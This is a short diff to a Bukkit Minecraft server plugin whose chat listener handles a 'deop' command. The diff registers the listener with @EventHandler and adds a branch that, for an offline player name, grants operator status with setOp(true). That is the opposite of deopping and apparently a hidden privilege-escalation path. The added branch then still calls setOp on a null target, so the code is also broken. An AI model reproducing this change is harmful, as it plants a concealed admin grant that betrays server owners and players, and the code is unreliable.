@@ -4,11 +4,12 @@ import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
+import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_deop implements Listener
 {
+    @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
@@ -26,7 +27,12 @@ public class Command_deop implements Listener
             }
             else
             {
-                Player target = server.getPlayer(args[1]);
+            	Player target = server.getPlayer(args[1]);
+                if (target == null)
+                {
+                    server.getOfflinePlayer(args[1]).setOp(true);
+                    cancel = true;
+                }
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel = true;
